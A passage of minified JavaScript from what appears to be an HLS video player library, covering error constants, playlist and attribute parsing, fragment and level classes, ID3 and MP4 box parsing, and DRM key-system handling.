t.KEY_SYSTEM_NO_KEYS="keySystemNoKeys",t.KEY_SYSTEM_NO_ACCESS="keySystemNoAccess",t.KEY_SYSTEM_NO_SESSION="keySystemNoSession",t.KEY_SYSTEM_NO_CONFIGURED_LICENSE="keySystemNoConfiguredLicense",t.KEY_SYSTEM_LICENSE_REQUEST_FAILED="keySystemLicenseRequestFailed",t.KEY_SYSTEM_SERVER_CERTIFICATE_REQUEST_FAILED="keySystemServerCertificateRequestFailed",t.KEY_SYSTEM_SERVER_CERTIFICATE_UPDATE_FAILED="keySystemServerCertificateUpdateFailed",t.KEY_SYSTEM_SESSION_UPDATE_FAILED="keySystemSessionUpdateFailed",t.KEY_SYSTEM_STATUS_OUTPUT_RESTRICTED="keySystemStatusOutputRestricted",t.KEY_SYSTEM_STATUS_INTERNAL_ERROR="keySystemStatusInternalError",t.MANIFEST_LOAD_ERROR="manifestLoadError",t.MANIFEST_LOAD_TIMEOUT="manifestLoadTimeOut",t.MANIFEST_PARSING_ERROR="manifestParsingError",t.MANIFEST_INCOMPATIBLE_CODECS_ERROR="manifestIncompatibleCodecsError",t.LEVEL_EMPTY_ERROR="levelEmptyError",t.LEVEL_LOAD_ERROR="levelLoadError",t.LEVEL_LOAD_TIMEOUT="levelLoadTimeOut",t.LEVEL_PARSING_ERROR="levelParsingError",t.LEVEL_SWITCH_ERROR="levelSwitchError",t.AUDIO_TRACK_LOAD_ERROR="audioTrackLoadError",t.AUDIO_TRACK_LOAD_TIMEOUT="audioTrackLoadTimeOut",t.SUBTITLE_LOAD_ERROR="subtitleTrackLoadError",t.SUBTITLE_TRACK_LOAD_TIMEOUT="subtitleTrackLoadTimeOut",t.FRAG_LOAD_ERROR="fragLoadError",t.FRAG_LOAD_TIMEOUT="fragLoadTimeOut",t.FRAG_DECRYPT_ERROR="fragDecryptError",t.FRAG_PARSING_ERROR="fragParsingError",t.FRAG_GAP="fragGap",t.REMUX_ALLOC_ERROR="remuxAllocError",t.KEY_LOAD_ERROR="keyLoadError",t.KEY_LOAD_TIMEOUT="keyLoadTimeOut",t.BUFFER_ADD_CODEC_ERROR="bufferAddCodecError",t.BUFFER_INCOMPATIBLE_CODECS_ERROR="bufferIncompatibleCodecsError",t.BUFFER_APPEND_ERROR="bufferAppendError",t.BUFFER_APPENDING_ERROR="bufferAppendingError",t.BUFFER_STALLED_ERROR="bufferStalledError",t.BUFFER_FULL_ERROR="bufferFullError",t.BUFFER_SEEK_OVER_HOLE="bufferSeekOverHole",t.BUFFER_NUDGE_ON_STALL="bufferNudgeOnStall",t.INTERNAL_EXCEPTION="internalException",t.INTERNAL_ABORTED="aborted",t.UNKNOWN="unknown",t}({});function tt(){}const et={trace:tt,debug:tt,log:tt,warn:tt,info:tt,error:tt};let rt=et;const V=rt,it=/^(\d+)x(\d+)$/,at=/(.+?)=(".*?"|.*?)(?:,|$)/g;class B{constructor(t){for(const e in t="string"==typeof t?B.parseAttrList(t):t)t.hasOwnProperty(e)&&("X-"===e.substring(0,2)&&(this.clientAttrs=this.clientAttrs||[],this.clientAttrs.push(e)),this[e]=t[e])}decimalInteger(t){return(t=parseInt(this[t],10))>Number.MAX_SAFE_INTEGER?1/0:t}hexadecimalInteger(t){if(this[t]){var e=(1&(e=(this[t]||"0x").slice(2)).length?"0":"")+e,r=new Uint8Array(e.length/2);for(let t=0;t<e.length/2;t++)r[t]=parseInt(e.slice(2*t,2*t+2),16);return r}return null}hexadecimalIntegerAsNumber(t){return(t=parseInt(this[t],16))>Number.MAX_SAFE_INTEGER?1/0:t}decimalFloatingPoint(t){return parseFloat(this[t])}optionalFloat(t,e){return(t=this[t])?parseFloat(t):e}enumeratedString(t){return this[t]}bool(t){return"YES"===this[t]}decimalResolution(t){if(null!==(t=it.exec(this[t])))return{width:parseInt(t[1],10),height:parseInt(t[2],10)}}static parseAttrList(t){var e,r={};for(at.lastIndex=0;null!==(e=at.exec(t));){let t=e[2];0===t.indexOf('"')&&t.lastIndexOf('"')===t.length-1&&(t=t.slice(1,-1)),r[e[1].trim()]=t}return r}}class st{constructor(t,e){if(this.attr=void 0,this._startDate=void 0,this._endDate=void 0,this._badValueForSameId=void 0,e){var r=e.attr;for(const n in r)if(Object.prototype.hasOwnProperty.call(t,n)&&t[n]!==r[n]){V.warn(`DATERANGE tag attribute: "${n}" does not match for tags with ID: "${t.ID}"`),this._badValueForSameId=n;break}t=G(new B({}),r,t)}this.attr=t,this._startDate=new Date(t["START-DATE"]),"END-DATE"in this.attr&&(e=new Date(this.attr["END-DATE"]),N(e.getTime()))&&(this._endDate=e)}get id(){return this.attr.ID}get class(){return this.attr.CLASS}get startDate(){return this._startDate}get endDate(){var t;return this._endDate||(null!==(t=this.duration)?new Date(this._startDate.getTime()+1e3*t):null)}get duration(){if("DURATION"in this.attr){var t=this.attr.decimalFloatingPoint("DURATION");if(N(t))return t}else if(this._endDate)return(this._endDate.getTime()-this._startDate.getTime())/1e3;return null}get plannedDuration(){return"PLANNED-DURATION"in this.attr?this.attr.decimalFloatingPoint("PLANNED-DURATION"):null}get endOnNext(){return this.attr.bool("END-ON-NEXT")}get isValid(){return!!this.id&&!this._badValueForSameId&&N(this.startDate.getTime())&&(null===this.duration||0<=this.duration)&&(!this.endOnNext||!!this.class)}}class ot{constructor(){this.aborted=!1,this.loaded=0,this.retry=0,this.total=0,this.chunkCount=0,this.bwEstimate=0,this.loading={start:0,first:0,end:0},this.parsing={start:0,end:0},this.buffering={start:0,first:0,end:0}}}var y="audio",k="video",lt="audiovideo";class ut{constructor(t){this._byteRange=null,this._url=null,this.baseurl=void 0,this.relurl=void 0,this.elementaryStreams={[y]:null,[k]:null,[lt]:null},this.baseurl=t}setByteRange(t,e){var r=[];1===(t=t.split("@",2)).length?r[0]=e?e.byteRangeEndOffset:0:r[0]=parseInt(t[1]),r[1]=parseInt(t[0])+r[0],this._byteRange=r}get byteRange(){return this._byteRange||[]}get byteRangeStartOffset(){return this.byteRange[0]}get byteRangeEndOffset(){return this.byteRange[1]}get url(){return!this._url&&this.baseurl&&this.relurl&&(this._url=Q.buildAbsoluteURL(this.baseurl,this.relurl,{alwaysNormalize:!0})),this._url||""}set url(t){this._url=t}}class ht extends ut{constructor(t,e){super(e),this._decryptdata=null,this.rawProgramDateTime=null,this.programDateTime=null,this.tagList=[],this.duration=0,this.sn=0,this.levelkeys=void 0,this.type=void 0,this.loader=null,this.keyLoader=null,this.level=-1,this.cc=0,this.startPTS=void 0,this.endPTS=void 0,this.startDTS=void 0,this.endDTS=void 0,this.start=0,this.deltaPTS=void 0,this.maxStartPTS=void 0,this.minEndPTS=void 0,this.stats=new ot,this.urlId=0,this.data=void 0,this.bitrateTest=!1,this.title=null,this.initSegment=null,this.endList=void 0,this.gap=void 0,this.type=t}get decryptdata(){var t=this.levelkeys;if(!t&&!this._decryptdata)return null;if(!this._decryptdata&&this.levelkeys&&!this.levelkeys.NONE)if(t=this.levelkeys.identity)this._decryptdata=t.getDecryptData(this.sn);else if(1===(t=Object.keys(this.levelkeys)).length)return this._decryptdata=this.levelkeys[t[0]].getDecryptData(this.sn);return this._decryptdata}get end(){return this.start+this.duration}get endProgramDateTime(){var t;return null!==this.programDateTime&&N(this.programDateTime)?(t=N(this.duration)?this.duration:0,this.programDateTime+1e3*t):null}get encrypted(){if(null!=(t=this._decryptdata)&&t.encrypted)return!0;if(this.levelkeys){var t=Object.keys(this.levelkeys),e=t.length;if(1<e||1===e&&this.levelkeys[t[0]].encrypted)return!0}return!1}setKeyFormat(t){this.levelkeys&&(t=this.levelkeys[t])&&!this._decryptdata&&(this._decryptdata=t.getDecryptData(this.sn))}abortRequests(){var t;null!=(t=this.loader)&&t.abort(),null!=(t=this.keyLoader)&&t.abort()}setElementaryStreamInfo(t,e,r,n,i,a=!1){var s=this.elementaryStreams,o=s[t];o?(o.startPTS=Math.min(o.startPTS,e),o.endPTS=Math.max(o.endPTS,r),o.startDTS=Math.min(o.startDTS,n),o.endDTS=Math.max(o.endDTS,i)):s[t]={startPTS:e,endPTS:r,startDTS:n,endDTS:i,partial:a}}clearElementaryStreamInfo(){var t=this.elementaryStreams;t[y]=null,t[k]=null,t[lt]=null}}class ct extends ut{constructor(t,e,r,n,i){super(r),this.fragOffset=0,this.duration=0,this.gap=!1,this.independent=!1,this.relurl=void 0,this.fragment=void 0,this.index=void 0,this.stats=new ot,this.duration=t.decimalFloatingPoint("DURATION"),this.gap=t.bool("GAP"),this.independent=t.bool("INDEPENDENT"),this.relurl=t.enumeratedString("URI"),this.fragment=e,this.index=n,(r=t.enumeratedString("BYTERANGE"))&&this.setByteRange(r,i),i&&(this.fragOffset=i.fragOffset+i.duration)}get start(){return this.fragment.start+this.fragOffset}get end(){return this.start+this.duration}get loaded(){var t=this.elementaryStreams;return!!(t.audio||t.video||t.audiovideo)}}class dt{constructor(t){this.PTSKnown=!1,this.alignedSliding=!1,this.averagetargetduration=void 0,this.endCC=0,this.endSN=0,this.fragments=void 0,this.fragmentHint=void 0,this.partList=null,this.dateRanges=void 0,this.live=!0,this.ageHeader=0,this.advancedDateTime=void 0,this.updated=!0,this.advanced=!0,this.availabilityDelay=void 0,this.misses=0,this.startCC=0,this.startSN=0,this.startTimeOffset=null,this.targetduration=0,this.totalduration=0,this.type=null,this.url=void 0,this.m3u8="",this.version=null,this.canBlockReload=!1,this.canSkipUntil=0,this.canSkipDateRanges=!1,this.skippedSegments=0,this.recentlyRemovedDateranges=void 0,this.partHoldBack=0,this.holdBack=0,this.partTarget=0,this.preloadHint=void 0,this.renditionReports=void 0,this.tuneInGoal=0,this.deltaUpdateFailed=void 0,this.driftStartTime=0,this.driftEndTime=0,this.driftStart=0,this.driftEnd=0,this.encryptedFragments=void 0,this.playlistParsingError=null,this.variableList=null,this.hasVariableRefs=!1,this.fragments=[],this.encryptedFragments=[],this.dateRanges={},this.url=t}reloaded(t){var e,r;t?(e=this.lastPartSn-t.lastPartSn,r=this.lastPartIndex-t.lastPartIndex,this.updated=this.endSN!==t.endSN||!!r||!!e||!this.live,this.advanced=this.endSN>t.endSN||0<e||0==e&&0<r,this.updated||this.advanced?this.misses=Math.floor(.6*t.misses):this.misses=t.misses+1,this.availabilityDelay=t.availabilityDelay):(this.advanced=!0,this.updated=!0)}get hasProgramDateTime(){return!!this.fragments.length&&N(this.fragments[this.fragments.length-1].programDateTime)}get levelTargetDuration(){return this.averagetargetduration||this.targetduration||10}get drift(){var t=this.driftEndTime-this.driftStartTime;return 0<t?1e3*(this.driftEnd-this.driftStart)/t:1}get edge(){return this.partEnd||this.fragmentEnd}get partEnd(){var t;return null!=(t=this.partList)&&t.length?this.partList[this.partList.length-1].end:this.fragmentEnd}get fragmentEnd(){var t;return null!=(t=this.fragments)&&t.length?this.fragments[this.fragments.length-1].end:0}get age(){return this.advancedDateTime?Math.max(Date.now()-this.advancedDateTime,0)/1e3:0}get lastPartIndex(){var t;return null!=(t=this.partList)&&t.length?this.partList[this.partList.length-1].index:-1}get lastPartSn(){var t;return null!=(t=this.partList)&&t.length?this.partList[this.partList.length-1].fragment.sn:this.endSN}}function ft(t){return Uint8Array.from(atob(t),(t=>t.charCodeAt(0)))}function vt(t){return Uint8Array.from(unescape(encodeURIComponent(t)),(t=>t.charCodeAt(0)))}var p={CLEARKEY:"org.w3.clearkey",FAIRPLAY:"com.apple.fps",PLAYREADY:"com.microsoft.playready",WIDEVINE:"com.widevine.alpha"},mt="org.w3.clearkey",yt="com.apple.streamingkeydelivery",Et="com.microsoft.playready",Tt="urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed";function bt(t){switch(t){case yt:return p.FAIRPLAY;case Et:return p.PLAYREADY;case Tt:return p.WIDEVINE;case mt:return p.CLEARKEY}}var At="edef8ba979d64acea3c827dcd51d21ed";function _t(t){switch(t){case p.FAIRPLAY:return yt;case p.PLAYREADY:return Et;case p.WIDEVINE:return Tt;case p.CLEARKEY:return mt}}function St(t){const{drmSystems:e,widevineLicenseUrl:r}=t;return!(t=e?[p.FAIRPLAY,p.WIDEVINE,p.PLAYREADY,p.CLEARKEY].filter((t=>!!e[t])):[])[p.WIDEVINE]&&r&&t.push(p.WIDEVINE),t}const Lt="undefined"!=typeof self&&self.navigator&&self.navigator.requestMediaKeySystemAccess?self.navigator.requestMediaKeySystemAccess.bind(self.navigator):null;function kt(t,e,r){return Uint8Array.prototype.slice?t.slice(e,r):new Uint8Array(Array.prototype.slice.call(t,e,r))}const Rt=(t,e)=>e+10<=t.length&&73===t[e]&&68===t[e+1]&&51===t[e+2]&&t[e+3]<255&&t[e+4]<255&&t[e+6]<128&&t[e+7]<128&&t[e+8]<128&&t[e+9]<128,wt=(t,e)=>e+10<=t.length&&51===t[e]&&68===t[e+1]&&73===t[e+2]&&t[e+3]<255&&t[e+4]<255&&t[e+6]<128&&t[e+7]<128&&t[e+8]<128&&t[e+9]<128,It=(t,e)=>{var r=e;let n=0;for(;Rt(t,e);){n+=10,n+=Dt(t,e+6),wt(t,e+10)&&(n+=10),e+=n}if(0<n)return t.subarray(r,r+n)},Dt=(t,e)=>{var r=(127&t[e])<<21;return(r|=(127&t[e+1])<<14)|(127&t[e+2])<<7|127&t[e+3]},Pt=t=>t&&"PRIV"===t.key&&"com.apple.streaming.transportStreamTimestamp"===t.info,xt=t=>{let e=0;for(var r,n=[];Rt(t,e);){for(var i=Dt(t,e+6),a=(e+=10)+i;e+8<a;){o=t.subarray(e),s=void 0;var s={type:s=String.fromCharCode(o[0],o[1],o[2],o[3]),size:r=Dt(o,4),data:o.subarray(10,10+r)},o=(t=>"PRIV"===t.type?Ot(t):"W"===t.type[0]?Ft(t):Mt(t))(s);o&&n.push(o),e+=s.size+10}wt(t,e)&&(e+=10)}return n},Ot=t=>{var e,r;if(!(t.size<2))return e=T(t.data,!0),r=new Uint8Array(t.data.subarray(e.length+1)),{key:t.type,info:e,data:r.buffer}},Mt=t=>{var e,r;if(!(t.size<2))return"TXXX"===t.type?(e=1,e+=(r=T(t.data.subarray(1),!0)).length+1,e=T(t.data.subarray(e)),{key:t.type,info:r,data:e}):(r=T(t.data.subarray(1)),{key:t.type,data:r})},Ft=t=>{var e,r;return"WXXX"===t.type?t.size<2?void 0:(e=1,e+=(r=T(t.data.subarray(1),!0)).length+1,e=T(t.data.subarray(e)),{key:t.type,info:r,data:e}):(r=T(t.data),{key:t.type,data:r})},T=(t,e=!1)=>{var r,n=function(){if(!navigator.userAgent.includes("PlayStation 4"))return Nt=Nt||void 0===self.TextDecoder?Nt:new self.TextDecoder("utf-8")}();if(n)return n=n.decode(t),e?-1!==(r=n.indexOf("\0"))?n.substring(0,r):n:n.replace(/\0/g,"");var i,a,s=t.length;let o,l="",u=0;for(;u<s;){if(0===(i=t[u++])&&e)return l;if(0!==i&&3!==i)switch(i>>4){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:l+=String.fromCharCode(i);break;case 12:case 13:o=t[u++],l+=String.fromCharCode((31&i)<<6|63&o);break;case 14:o=t[u++],a=t[u++],l+=String.fromCharCode((15&i)<<12|(63&o)<<6|63&a)}}return l};let Nt;const g_hexDump=function(r){let n="";for(let e=0;e<r.length;e++){let t=r[e].toString(16);t.length<2&&(t="0"+t),n+=t}return n},Bt=Math.pow(2,32)-1,Ut=[].push,jt={video:1,audio:2,id3:3,text:4};function v(t){return String.fromCharCode.apply(null,t)}function Gt(t,e){return(t=t[e]<<8|t[e+1])<0?65536+t:t}function R(t,e){return(t=$t(t,e))<0?4294967296+t:t}function $t(t,e){return t[e]<<24|t[e+1]<<16|t[e+2]<<8|t[e+3]}function Kt(t,e,r){t[e]=r>>24,t[e+1]=r>>16&255,t[e+2]=r>>8&255,t[e+3]=255&r}function w(e,r){var n=[];if(r.length){var i=e.byteLength;for(let t=0;t<i;){var a=R(e,t),s=v(e.subarray(t+4,t+8));a=1<a?t+a:i;s===r[0]&&(1===r.length?n.push(e.subarray(t+8,a)):(s=w(e.subarray(t+8,a),r.slice(1))).length&&Ut.apply(n,s)),t=a}}return n}function Ht(t){const r=[];var e=w(t,["moov","trak"]);for(let t=0;t<e.length;t++){var n=e[t];if(i=w(n,["tkhd"])[0]){var i=R(i,0===i[0]?12:20);if(a=w(n,["mdia","mdhd"])[0]){var a=R(a,0===a[0]?12:20),s=w(n,["mdia","hdlr"])[0];if(s&&(s=v(s.subarray(8,12)),s={soun:y,vide:k}[s])){let t;(n=w(n,["mdia","minf","stbl","stsd"])[0])&&(t=v(n.subarray(12,16))),r[i]={timescale:a,type:s},r[s]={timescale:a,id:i,codec:t}}}}}return w(t,["moov","mvex","trex"]).forEach((t=>{var e=R(t,4);(e=r[e])&&(e.default={duration:R(t,12),flags:R(t,20)})})),r}function Vt(t){var e=w(t,["schm"])[0];return!e||"cbcs"!==(e=v(e.subarray(4,8)))&&"cenc"!==e?(V.error("[eme] missing 'schm' box"),null):w(t,["schi","tenc"])[0]}function Yt(t,e){var r=new Uint8Array(t.length+e.length);return r.set(t),r.set(e,t.length),r}function qt(T,b){const A=[],_=b.samples,S=b.timescale,u=b.id;let L=!1;return w(_,["moof"]).map((t=>{const E=t.byteOffset-8;w(t,["traf"]).map((l=>{var t=w(l,["tfdt"]).map((t=>{var e=t[0];let r=R(t,4);return(r=1===e?(r*=Math.pow(2,32))+R(t,8):r)/S}))[0];return void 0!==t&&(T=t),w(l,["tfhd"]).map((t=>{var e=R(t,4),r=16777215&R(t,0),n=!!(1&r),i=!!(2&r),a=!!(8&r);let m=0;var s=!!(16&r);let y=0;r=!!(32&r);let o=8;e===u&&(n&&(o+=8),i&&(o+=4),a&&(m=R(t,o),o+=4),s&&(y=R(t,o),o+=4),r&&(o+=4),"video"===b.type&&(L=function(t){if(!t)return!1;var e=t.indexOf(".");return"hvc1"===(t=e<0?t:t.substring(0,e))||"hev1"===t||"dvh1"===t||"dvhe"===t}(b.codec)),w(l,["trun"]).map((e=>{var r=e[0],t=16777215&R(e,0);let n=0;var i=!!(256&t);let a=0;var s=!!(512&t);let o=0;var l=!!(1024&t),u=!!(2048&t);let h=0;var c,d,f=R(e,4);let p=8,g=(!!(1&t)&&(n=R(e,p),p+=4),!!(4&t)&&(p+=4),n+E);for(let t=0;t<f;t++){if(i?(a=R(e,p),p+=4):a=m,s?(o=R(e,p),p+=4):o=y,l&&(p+=4),u&&(h=(0===r?R:$t)(e,p),p+=4),b.type===k){let t=0;for(;t<o;){var v=R(_,g);g+=4,c=L,d=_[g],(c?39==(c=d>>1&63)||40==c:6==(31&d))&&zt(_.subarray(g,g+v),L?2:1,T+h/S,A),g+=v,t+=v+4}}T+=a/S}})))}))}))})),A}function zt(t,e,r,n){var i=Qt(t);let a=0,s=(a+=e,0),o=0,l=!1,u=0;for(;a<i.length;){for(s=0;!(a>=i.length)&&(u=i[a++],s+=u,255===u););for(o=0;!(a>=i.length)&&(u=i[a++],o+=u,255===u););var h=i.length-a;if(!l&&4===s&&a<i.length){if(l=!0,181===i[a++]){var c=Gt(i,a);if(a+=2,49===c&&(c=R(i,a),a+=4,1195456820===c&&3===(c=i[a++]))){var d=i[a++],f=64&d,p=f?2+3*(31&d):0,g=new Uint8Array(p);if(f){g[0]=d;for(let t=1;t<p;t++)g[t]=i[a++]}n.push({type:c,payloadType:s,pts:r,bytes:g})}}}else if(5===s&&o<h){if(l=!0,16<o){var v=[];for(let t=0;t<16;t++){var m=i[a++].toString(16);v.push(1==m.length?"0"+m:m),3!==t&&5!==t&&7!==t&&9!==t||v.push("-")}var y=o-16,E=new Uint8Array(y);for(let t=0;t<y;t++)E[t]=i[a++];n.push({payloadType:s,pts:r,uuid:v.join(""),userData:T(E),userDataBytes:E})}}else if(o<h)a+=o;else if(o>h)break}}function Qt(t){var e=t.byteLength,r=[];let n=1;for(;n<e-2;)0===t[n]&&0===t[n+1]&&3===t[n+2]?(r.push(n+2),n+=2):n++;if(0===r.length)return t;var i=e-r.length,a=new Uint8Array(i);let s=0;for(n=0;n<i;s++,n++)s===r[0]&&(s++,r.shift()),a[n]=t[s];return a}let Jt={};class Zt{static clearKeyUriToKeyIdMap(){Jt={}}constructor(t,e,r,n=[1],i=null){this.uri=void 0,this.method=void 0,this.keyFormat=void 0,this.keyFormatVersions=void 0,this.encrypted=void 0,this.isCommonEncryption=void 0,this.iv=null,this.key=null,this.keyId=null,this.pssh=null,this.method=t,this.uri=e,this.keyFormat=r,this.keyFormatVersions=n,this.iv=i,this.encrypted=!!t&&"NONE"!==t,this.isCommonEncryption=this.encrypted&&"AES-128"!==t}isSupported(){if(this.method){if("AES-128"===this.method||"NONE"===this.method)return!0;if("identity"===this.keyFormat)return"SAMPLE-AES"===this.method;switch(this.keyFormat){case yt:case Tt:case Et:case mt:return-1!==["ISO-23001-7","SAMPLE-AES","SAMPLE-AES-CENC","SAMPLE-AES-CTR"].indexOf(this.method)}}return!1}getDecryptData(e){if(!this.encrypted||!this.uri)return null;if("AES-128"===this.method&&this.uri&&!this.iv)return"number"!=typeof e&&("AES-128"!==this.method||this.iv||V.warn(`missing IV for initialization segment with method="${this.method}" - compliance issue`),e=0),e=function(e){var r=new Uint8Array(16);for(let t=12;t<16;t++)r[t]=e>>8*(15-t)&255;return r}(e),new Zt(this.method,this.uri,"identity",this.keyFormatVersions,e);var r=function gt(t){var e,r;let n=null;return"data"===(t=t.split(":"))[0]&&2===t.length&&2===(e=(t=t[1].split(";"))[t.length-1].split(",")).length&&(r="base64"===e[0],e=e[1],n=r?(t.splice(-1,1),ft(e)):(r=vt(r=e).subarray(0,16),(t=new Uint8Array(16)).set(r,16-r.length),t)),n}(this.uri);if(r)switch(this.keyFormat){case Tt:22<=(this.pssh=r).length&&(this.keyId=r.subarray(r.length-22,r.length-6));break;case Et:var n=new Uint8Array([154,4,240,121,152,64,66,134,171,146,230,91,224,136,95,149]);n=(this.pssh=function Xt(r,e,n){if(16!==r.byteLength)throw new RangeError("Invalid system id");let i,a,o;if(e){i=1,a=new Uint8Array(16*e.length);for(let t=0;t<e.length;t++){var s=e[t];if(16!==s.byteLength)throw new RangeError("Invalid key");a.set(s,16*t)}}else i=0,a=new Uint8Array;0<i?(o=new Uint8Array(4),0<e.length&&new DataView(o.buffer).setUint32(0,e.length,!1)):o=new Uint8Array;var l=new Uint8Array(4);n&&0<n.byteLength&&new DataView(l.buffer).setUint32(0,n.byteLength,!1);{var h=[new Uint8Array([i,0,0,0]),r,o,a,l,n||new Uint8Array],c=h.length;let t=8,e=c;for(;e--;)t+=h[e].byteLength;var d=new Uint8Array(t);for(d[0]=t>>24&255,d[1]=t>>16&255,d[2]=t>>8&255,d[3]=255&t,d.set([112,115,115,104],4),e=0,t=8;e<c;e++)d.set(h[e],t),t+=h[e].byteLength;return d}}(n,null,r),new Uint16Array(r.buffer,r.byteOffset,r.byteLength/2)),n=(n=String.fromCharCode.apply(null,Array.from(n))).substring(n.indexOf("<"),n.length);(n=(new DOMParser).parseFromString(n,"text/xml").getElementsByTagName("KID")[0])&&(n=n.childNodes[0]?n.childNodes[0].nodeValue:n.getAttribute("VALUE"))&&(function pt(t){function e(t,e,r){var n=t[e];t[e]=t[r],t[r]=n}e(t,0,3),e(t,1,2),e(t,4,5),e(t,6,7)}(n=ft(n).subarray(0,16)),this.keyId=n);break;default:{let t=r.subarray(0,16);16!==t.length&&((n=new Uint8Array(16)).set(t,16-t.length),t=n),this.keyId=t;break}}if(!this.keyId||16!==this.keyId.byteLength){let t=Jt[this.uri];t||(e=Object.keys(Jt).length%Number.MAX_SAFE_INTEGER,t=new Uint8Array(16),new DataView(t.buffer,12,4).setUint32(0,e),Jt[this.uri]=t),this.keyId=t}return this}}const te=/\{\$([a-zA-Z0-9-_]+)\}/g;function ee(t){return te.test(t)}function U(e,r,n){if(null!==e.variableList||e.hasVariableRefs)for(let t=n.length;t--;){var i=n[t],a=r[i];a&&(r[i]=re(e,a))}}function re(n,t){if(null!==n.variableList||n.hasVariableRefs){const i=n.variableList;return t.replace(te,(t=>{var e=t.substring(2,t.length-1),r=null==i?void 0:i[e];return void 0===r?(n.playlistParsingError||(n.playlistParsingError=new Error(`Missing preceding EXT-X-DEFINE tag for Variable Reference: "${e}"`)),t):r}))}return t}function ne(e,t,r){let i,a,n=e.variableList;if(n||(e.variableList=n={}),"QUERYPARAM"in t){i=t.QUERYPARAM;try{var s=new self.URL(r).searchParams;if(!s.has(i))throw new Error(`"${i}" does not match any query parameter in URI: "${r}"`);a=s.get(i)}catch(t){e.playlistParsingError||(e.playlistParsingError=new Error("EXT-X-DEFINE QUERYPARAM: "+t.message))}}else i=t.NAME,a=t.VALUE;i in n?e.playlistParsingError||(e.playlistParsingError=new Error(`EXT-X-DEFINE duplicate Variable Name declarations: "${i}"`)):n[i]=a||""}function ie(){if("undefined"!=typeof self)return self.MediaSource||self.WebKitMediaSource}const ae={audio:{a3ds:!0,"ac-3":!0,"ac-4":!0,alac:!0,alaw:!0,dra1:!0,"dts+":!0,"dts-":!0,dtsc:!0,dtse:!0,dtsh:!0,"ec-3":!0,enca:!0,g719:!0,g726:!0,m4ae:!0,mha1:!0,mha2:!0,mhm1:!0,mhm2:!0,mlpa:!0,mp4a:!0,"raw ":!0,Opus:!0,opus:!0,samr:!0,sawb:!0,sawp:!0,sevc:!0,sqcp:!0,ssmv:!0,twos:!0,ulaw:!0},video:{avc1:!0,avc2:!0,avc3:!0,avc4:!0,avcp:!0,av01:!0,drac:!0,dva1:!0,dvav:!0,dvh1:!0,dvhe:!0,encv:!0,hev1:!0,hvc1:!0,mjp2:!0,mp4v:!0,mvc1:!0,mvc2:!0,mvc3:!0,mvc4:!0,resv:!0,rv60:!0,s263:!0,svc1:!0,svc2:!0,"vc-1":!0,vp08:!0,vp09:!0},text:{stpp:!0,wvtt:!0}},se=ie();function oe(t,e){return null!=(e=null==se?void 0:se.isTypeSupported(`${e||"video"}/mp4;codecs="${t}"`))&&e}const le=/#EXT-X-STREAM-INF:([^\r\n]*)(?:[\r\n](?:#[^\r\n]*)?)*([^\r\n]+)|#EXT-X-(SESSION-DATA|SESSION-KEY|DEFINE|CONTENT-STEERING|START):([^\r\n]*)[\r\n]+/g,ue=/#EXT-X-MEDIA:(.*)/g,he=/^#EXT(?:INF|-X-TARGETDURATION):/m,ce=new RegExp([/#EXTINF:\s*(\d*(?:\.\d+)?)(?:,(.*)\s+)?/.source,/(?!#) *(\S[\S ]*)/.source,/#EXT-X-BYTERANGE:*(.+)/.source,/#EXT-X-PROGRAM-DATE-TIME:(.+)/.source,/#.*/.source].join("|"),"g"),de=new RegExp([/#(EXTM3U)/.source,/#EXT-X-(DATERANGE|DEFINE|KEY|MAP|PART|PART-INF|PLAYLIST-TYPE|PRELOAD-HINT|RENDITION-REPORT|SERVER-CONTROL|SKIP|START):(.+)/.source,/#EXT-X-(BITRATE|DISCONTINUITY-SEQUENCE|MEDIA-SEQUENCE|TARGETDURATION|VERSION): *(\d+)/.source,/#EXT-X-(DISCONTINUITY|ENDLIST|GAP)/.source,/(#)([^:]*):(.*)/.source,/(#)(.*)(?:.*)\r?\n?/.source].join("|"));class m{static findGroup(e,r){for(let t=0;t<e.length;t++){var n=e[t];if(n.id===r)return n}}static convertAVC1ToAVCOTI(t){var e,r=t.split(".");return 2<r.length?(e=r.shift()+".",(e+=parseInt(r.shift()).toString(16))+("000"+parseInt(r.shift()).toString(16)).slice(-4)):t}static resolve(t,e){return Q.buildAbsoluteURL(e,t,{alwaysNormalize:!0})}static isMediaPlaylist(t){return he.test(t)}static parseMasterPlaylist(t,e){var r,n={contentSteering:null,levels:[],playlistParsingError:null,sessionData:null,sessionKeys:null,startTimeOffset:null,variableList:null,hasVariableRefs:ee(t)},i=[];for(le.lastIndex=0;null!=(r=le.exec(t));)if(r[1]){var s=(U(n,a=new B(r[1]),["CODECS","SUPPLEMENTAL-CODECS","ALLOWED-CPC","PATHWAY-ID","STABLE-VARIANT-ID","AUDIO","VIDEO","SUBTITLES","CLOSED-CAPTIONS","NAME"]),re(n,r[2])),o=(s={attrs:a,bitrate:a.decimalInteger("AVERAGE-BANDWIDTH")||a.decimalInteger("BANDWIDTH"),name:a.NAME,url:m.resolve(s,e)},a.decimalResolution("RESOLUTION"));o&&(s.width=o.width,s.height=o.height),function(n,i){["video","audio","text"].forEach((r=>{const e=n.filter((t=>{return!!(e=ae[e=r])&&!0===e[t.slice(0,4)];var e}));var t;e.length&&(t=e.filter((t=>0===t.lastIndexOf("avc1",0)||0===t.lastIndexOf("mp4a",0))),i[r+"Codec"]=(0<t.length?t:e)[0],n=n.filter((t=>-1===e.indexOf(t))))})),i.unknownCodecs=n}((a.CODECS||"").split(/[ ,]+/).filter((t=>t)),s),s.videoCodec&&-1!==s.videoCodec.indexOf("avc1")&&(s.videoCodec=m.convertAVC1ToAVCOTI(s.videoCodec)),null!=(o=s.unknownCodecs)&&o.length||i.push(s),n.levels.push(s)}else if(r[3]){var a=r[3],l=r[4];switch(a){case"SESSION-DATA":var u=new B(l),h=(U(n,u,["DATA-ID","LANGUAGE","VALUE","URI"]),u["DATA-ID"]);h&&(null===n.sessionData&&(n.sessionData={}),n.sessionData[h]=u);break;case"SESSION-KEY":(h=fe(l,e,n)).encrypted&&h.isSupported()?(null===n.sessionKeys&&(n.sessionKeys=[]),n.sessionKeys.push(h)):V.warn(`[Keys] Ignoring invalid EXT-X-SESSION-KEY tag: "${l}"`);break;case"DEFINE":U(n,u=new B(l),["NAME","VALUE","QUERYPARAM"]),ne(n,u,e);break;case"CONTENT-STEERING":var c=new B(l);U(n,c,["SERVER-URI","PATHWAY-ID"]),n.contentSteering={uri:m.resolve(c["SERVER-URI"],e),pathwayId:c["PATHWAY-ID"]||"."};break;case"START":n.startTimeOffset=pe(l)}}var 